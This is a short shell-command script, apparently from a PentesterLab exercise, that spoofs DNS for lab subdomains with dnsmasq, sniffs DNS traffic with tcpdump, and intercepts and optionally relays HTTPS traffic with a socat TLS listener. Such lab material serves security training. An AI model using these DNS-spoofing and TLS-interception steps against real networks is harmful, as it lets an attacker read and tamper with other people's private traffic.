# configure a simple DNS server
echo 'addn-hosts=dnsmasq.hosts' > dnsmasq.conf
echo '127.0.0.123 test1.pentesterlab.com' > dnsmasq.hosts

# configure the router to redirect UDP 53 from WAN to LAN

# run the DNS server
sudo dnsmasq -C etc/dnsmasq/dnsmasq.conf --no-daemon

# dump the UDP traffic
sudo tcpdump -i wlan0 udp port 53

# add the new subdomain to the list
echo '1.2.3.4 mitm3.pentesterlab.com' >> /etc/dnsmasq/dnsmasq.hosts

# configure the router to redirect TCP 80 & 443 from WAN to LAN

# and capture HTTPS requests using the secrets for "hackingwithpentesterlab"
sudo socat openssl-listen:443,reuseaddr,fork,cert=etc/openssl/hackingwithpentesterlab.link.crt,cafile=etc/openssl/GandiStandardSSLCA2.pem,key=etc/openssl/hackingwithpentesterlab.link.key,verify=0 -

# bonus: capture and forward
sudo socat openssl-listen:443,reuseaddr,fork,cert=etc/openssl/hackingwithpentesterlab.link.crt,cafile=etc/openssl/GandiStandardSSLCA2.pem,key=etc/openssl/hackingwithpentesterlab.link.key,verify=0 openssl-connect:[SERVER]:[PORT],verify=0
